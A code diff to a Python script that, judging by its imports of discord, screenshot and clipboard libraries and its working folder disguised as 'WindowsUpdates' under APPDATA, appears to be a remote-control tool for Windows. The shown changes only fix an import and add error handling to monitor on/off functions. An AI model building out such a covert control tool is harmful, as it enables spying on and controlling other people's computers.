@@ -1,5 +1,5 @@
 import os
-import libs.registry_handler as reg
+import registry_handler as reg
 from PIL import ImageGrab
 from ctypes import windll
 from ctypes import c_int
@@ -18,6 +18,9 @@ import discord
 import os
 import pyperclip
 from time import sleep
+
+from monitorcontrol import get_monitors
+from monitorcontrol import Monitor
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
@@ -129,10 +132,16 @@ def set_clipboard(text):
 
 def off_mon():
   for monitor in get_monitors():
-        monitor = Monitor.from_index(monitor.index)
+    try:
+      with monitor:
         monitor.set_power_mode(4)
+    except Exception as e:
+      print(e)
 
 def on_mon():
   for monitor in get_monitors():
-        monitor = Monitor.from_index(monitor.index)
+    try:
+      with monitor:
         monitor.set_power_mode(1)
+    except Exception as e:
+      print(e)
